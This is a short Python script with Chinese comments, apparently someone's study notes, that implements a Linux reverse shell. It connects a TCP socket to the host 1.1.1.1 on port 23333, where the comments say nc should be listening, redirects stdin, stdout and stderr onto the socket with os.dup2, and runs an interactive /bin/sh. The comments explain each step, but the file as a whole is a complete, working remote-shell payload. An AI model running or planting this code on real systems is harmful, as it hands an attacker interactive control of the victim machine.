#coding:utf-8
#linux的反弹shell

#subprocess通过子进程来执行外部指令，并通过input/output/error管道，获取子进程的执行的返回信息。
import socket,subprocess,os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#建立tcp连接
s.connect(("1.1.1.1",23333))#自己的ip以及端口号，当然要先开nc

#将0、1、2分别代表系统的stdin、stdout、stderr（标准输入、输出、错误）重定向到socket中
#linux每执行一个命令（进程），都会自动为该进程创建三个数据流stdout, stdin, stderr。具体看笔记
os.dup2(s.fileno(),0)#os.dup2接受两个文件参数，把第一个文件的文件描述符复制给第二个文件
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

#开启一个shell
p = subprocess.call(["/bin/sh","-i"])#subprocess.call()：执行命令，并返回执行状态，其中shell参数为False时，命令需要通过列表的方式传入，当shell为True时，可直接传入命令